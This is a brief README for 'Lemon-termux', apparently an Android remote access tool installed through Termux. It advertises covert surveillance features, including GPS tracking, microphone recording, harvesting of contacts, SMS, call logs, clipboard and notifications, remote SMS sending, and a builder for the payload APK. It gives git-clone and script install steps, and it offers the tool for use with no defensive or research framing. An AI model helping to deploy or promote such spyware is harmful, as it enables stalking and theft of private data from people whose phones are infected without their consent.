# Lemon-termux

 

### AVAILABLE ON :

* Termux
* Linux

### REQUIREMENTS :

* Apktool
* Java 1.8.0
* Gem
* Git
* Ruby
* Bundle
* Many more ......


### FEATURES :
* [+] GPS Logging
* [+] Microphone Recording
* [+] View Contacts
* [+] SMS Logs
* [+] Send SMS
* [+] Call Logs
* [+] View Installed Apps
* [+] View Stub Permissions
* [+] Live Clipboard Logging
* [+] Live Notification Logging
* [+] View WiFi Networks (logs previously seen)
* [+] File Explorer & Downloader
* [+] Command Queuing
* [+] Built In APK Builder
* [+] Error fixed !

## INSTALLATION [Termux] :

* `apt-get update -y`
* `apt-get upgrade -y`
* `apt install python python2 -y`
* `pip install lolcat`
* `git clone https://github.com/h4ck3r0/Lemon-termux`
* `cd Lemon-termux`
* `bash lemon.sh`

[+]-- Type lemon To Run
